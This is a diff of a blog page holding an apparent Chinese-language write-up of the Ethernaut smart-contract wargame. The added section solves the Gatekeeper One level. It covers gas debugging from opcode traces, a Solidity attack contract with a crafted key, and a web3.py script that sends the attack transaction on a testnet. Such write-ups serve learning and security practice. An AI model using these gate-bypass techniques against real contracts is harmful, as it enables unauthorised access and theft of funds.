@@ -55,8 +55,20 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202310230142626.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202310230249848.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202310241010622.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311291626269.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311291631672.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311291637508.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311291638236.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311291651820.png">
+<meta property="og:image" content="c:\Users\13246\AppData\Roaming\Typora\typora-user-images\image-20231129165531255.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311292140786.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311300207236.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311300312620.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311300312156.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311300321502.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311300323303.png">
 <meta property="article:published_time" content="2023-10-07T04:00:00.000Z">
-<meta property="article:modified_time" content="2023-11-07T04:56:39.732Z">
+<meta property="article:modified_time" content="2023-11-29T19:24:47.171Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="solidity">
 <meta name="twitter:card" content="summary">
@@ -375,8 +387,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2023-11-07 12:56:39</span>
-            <span class="mobile">2023-11-07 12:56:39</span>
+            <span class="desktop">2023-11-30 03:24:47</span>
+            <span class="mobile">2023-11-30 03:24:47</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -505,7 +517,7 @@
                 ></p>
 <p>Balance 处已经变为0了。</p>
 <p>接下来在线上环境打一遍，难点在对于<code>web3-eth</code>包中<code>sendTransaction()</code>函数的<a class="link"   target="_blank" rel="noopener" href="https://learnblockchain.cn/docs/web3.js/web3-eth.html#sendtransaction" >使用 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，还有就是不依赖 Remix 对合约的函数进行调用，一般以太坊交易包含四个字段，分别是 to、from、amout、data ，其中函数调用信息封装在 data 字段中（<code>sendTransaction()</code>中形参叫做 value）。</p>
-<p>data 字段的数据是对函数签名字符串进行 keccak256 哈希运算之后，取前四个字节。</p>
+<p>data 字段的数据是对函数签名字符串进行 keccak256 哈希运算之后，取前四个字节。contribute()attack()</p>
 <p>先看看调用 contribute 的操作（图丢了，假装有个图吧。应该有个 data 字段，值为 0xd7bb99ba）：</p>
 <p>然后是 receive：</p>
 <p><img  
@@ -824,7 +836,105 @@
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(gasleft() % 8191 == 0);</span><br></pre></td></tr></table></figure></div>
 
 <p>这里要求剩余的 gas 必须是8191的整数倍，且不能为0，因为 Solidity 对0取模会报出 Panic 错误。</p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>未完待续。。</p>
+<p>这里需要看实际消耗的 gas，所以要利用以太坊浏览器上链调试，写个初步的攻击合约看看：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">    GatekeeperOne public myGate;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) public &#123;</span><br><span class="line">        myGate = GatekeeperOne(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        myGate.enter(0x123456780000e411);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>查看操作码：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311291626269.png"
+                      alt="image-20231129162654806"
+                ></p>
+<p>看到整个过程中有两个 REVERT，其中第一个是目标合约 gateTwo 中触发的，顺着往上找到了 GAS。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311291631672.png"
+                      alt="image-20231129163152030"
+                ></p>
+<p>对 GAS 的解释是：在这条指令执行之后剩余的 gas，所以这里的 GAS 就是 gateTwo 中的 gasleft()，调一下 gas 就行。</p>
+<p>这里把 GAS LIMIT 设置成819100，继续查看：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311291637508.png"
+                      alt="image-20231129163727465"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311291638236.png"
+                      alt="image-20231129163801201"
+                ></p>
+<p>结果是780160，819100-780160&#x3D;38940，即为运行到 gasleft() 处花费的 gas。所以我们提供819100+38940&#x3D;858040的 gas 即可通过 gateTwo</p>
+<p>。。。吗？</p>
+<p>首先上文我犯了个错误，gasleft() 返回值为执行完 GAS 后的剩余 gas 值，所以我们参考的值应该为：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311291651820.png"
+                      alt="image-20231129165123779"
+                ></p>
+<p>其次，即使我们参考正确的 gas 值进行计算得出理论上正确的 gas limit（858042），也无济于事</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:\Users\13246\AppData\Roaming\Typora\typora-user-images\image-20231129165531255.png"
+                      alt="image-20231129165531255"
+                ></p>
+<p>看这个小玩意，问题出在这里，使用 Txn Type 2 会导致 gas 费用是动态的，简单来说是会给到矿工合适的小费，这个“合适”并不固定，所以一直算不准。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311292140786.png"
+                      alt="image-20231129214045743"
+                ></p>
+<p>关于 <a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/feeltouch/article/details/124975358" >EIP-1559 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
+<p>由于 Txn Type 0 的交易并不会定义 maxFee 和 maxPriority，即提供多少 gas 是固定的，那么发送这种类型的交易即可。</p>
+<p>。。。吗？</p>
+<p>猜测：实际上由于 gasPrice 的变化，即使使用 Type 0 也无济于事，只能减少它的浮动范围罢了。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311300207236.png"
+                     
+                ></p>
+<p>结果：把 gas 固定在100000进行测试，每次都一样，从调用直到 GAS 操作码执行完毕消耗27706，把 gas 增加至819100，测试下，到 GAS 之后稳定消耗38942。实在是找不出导致这种现象的原因，一步一步调着先吧，最终调试出 gas 为858660时可以稳定成功。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311300312620.png"
+                      alt="image-20231130031208573" style="zoom:150%;" 
+                >
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311300312156.png"
+                      alt="image-20231130031249102"
+                ></p>
+<p>这里连续执行了5次，都是成功的。</p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>攻击合约：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">    GatekeeperOne public myGate;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) public &#123;</span><br><span class="line">        myGate = GatekeeperOne(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        myGate.enter(0x123456780000e411);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>用于调用攻击合约方法的 python 脚本：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line">web3 = Web3(Web3.HTTPProvider(<span class="string">&#x27;https://rpc.sepolia.org&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sender_address = <span class="string">&#x27;SENDER_ADDRESS&#x27;</span></span><br><span class="line">recipient_address = <span class="string">&#x27;RECIPIENT_ADDRESS&#x27;</span></span><br><span class="line"></span><br><span class="line">private_key = <span class="string">&#x27;YOUR_PRIVATE_KEY&#x27;</span></span><br><span class="line"></span><br><span class="line">transaction_params = &#123;</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: sender_address,</span><br><span class="line">    <span class="string">&#x27;to&#x27;</span>: recipient_address,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: <span class="number">0x9e5faafc</span>,</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: web3.eth.get_transaction_count(sender_address),</span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">858660</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: web3.eth.gas_price,</span><br><span class="line">    <span class="string">&#x27;chainId&#x27;</span>: <span class="number">11155111</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">transaction = web3.eth.account.sign_transaction(transaction_params, private_key)</span><br><span class="line">transaction_hash = web3.eth.send_raw_transaction(transaction.rawTransaction)</span><br><span class="line">transaction_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> transaction_receipt.status:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Transaction successful!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Transaction failed.&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>我也不知道为什么我要写个 py 脚本来调用攻击合约，本来全部东西都可以写进合约里面的，但是我开始有写循环的想法就下意识去用 Web3.py 了。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311300321502.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311300323303.png"
+                      alt="image-20231130032336251"
+                ></p>
+<h2 id="14-Gatekeeper-Two"><a href="#14-Gatekeeper-Two" class="headerlink" title="14 Gatekeeper Two"></a>14 Gatekeeper Two</h2><p>未完待续捏。。</p>
 
         </div>
 
@@ -839,7 +949,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2023-11-07 12:56:39
+                    :</strong> 2023-11-30 03:24:47
             </li>
         
         <li>
@@ -919,7 +1029,7 @@
     <div class="post-toc">
         <div class="toc-title">On this page</div>
         <div class="page-title">Ethernaut WP _持续更新中。。。</div>
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#00-Hello-Ethernaut"><span class="nav-text">00 Hello Ethernaut</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#01-Fallback"><span class="nav-text">01 Fallback</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#02-Fal1out"><span class="nav-text">02 Fal1out</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#03-Coin-Flip"><span class="nav-text">03 Coin Flip</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#04-Telephone"><span class="nav-text">04 Telephone</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#05-Token"><span class="nav-text">05 Token</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#06-Delegation"><span class="nav-text">06 Delegation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#07-Force"><span class="nav-text">07 Force</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#08-Vault"><span class="nav-text">08 Vault</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#09-King"><span class="nav-text">09 King</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-Re-entrancy"><span class="nav-text">10 Re-entrancy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-Elevator"><span class="nav-text">11 Elevator</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12-Privacy"><span class="nav-text">12 Privacy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#13-Gatekeeper-One"><span class="nav-text">13 Gatekeeper One</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Code"><span class="nav-text">Code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Description"><span class="nav-text">Description</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analyze"><span class="nav-text">Analyze</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit"><span class="nav-text">Exploit</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#00-Hello-Ethernaut"><span class="nav-text">00 Hello Ethernaut</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#01-Fallback"><span class="nav-text">01 Fallback</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#02-Fal1out"><span class="nav-text">02 Fal1out</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#03-Coin-Flip"><span class="nav-text">03 Coin Flip</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#04-Telephone"><span class="nav-text">04 Telephone</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#05-Token"><span class="nav-text">05 Token</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#06-Delegation"><span class="nav-text">06 Delegation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#07-Force"><span class="nav-text">07 Force</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#08-Vault"><span class="nav-text">08 Vault</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#09-King"><span class="nav-text">09 King</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-Re-entrancy"><span class="nav-text">10 Re-entrancy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-Elevator"><span class="nav-text">11 Elevator</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12-Privacy"><span class="nav-text">12 Privacy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#13-Gatekeeper-One"><span class="nav-text">13 Gatekeeper One</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Code"><span class="nav-text">Code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Description"><span class="nav-text">Description</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analyze"><span class="nav-text">Analyze</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit"><span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#14-Gatekeeper-Two"><span class="nav-text">14 Gatekeeper Two</span></a></li></ol>
 
     </div>
 </div>
